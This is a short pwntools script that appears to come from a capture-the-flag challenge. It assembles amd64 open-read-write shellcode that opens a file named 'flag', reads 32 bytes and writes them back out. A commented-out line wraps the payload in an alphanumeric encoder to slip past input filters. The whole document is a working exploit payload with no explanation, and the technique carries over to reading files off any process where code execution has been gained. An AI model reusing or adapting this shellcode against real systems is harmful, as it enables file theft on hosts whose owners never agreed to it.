from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')

sc = '''
mov rax,%s
push rax
mov rdi,rsp
mov rax,2
mov rsi,0
syscall

mov rdi,rax
sub rsp,0x20
mov rsi,rsp
mov rdx,0x20
mov rax,0
syscall

mov rdi,0
mov rsi,rsp
mov rdx,0x20
mov rax,1
syscall

''' % hex(u64(file_name))
sc = asm(sc)
print(sc)
#print asm("push r12;pop rax;") + alphanum_encoder(sc, 3)
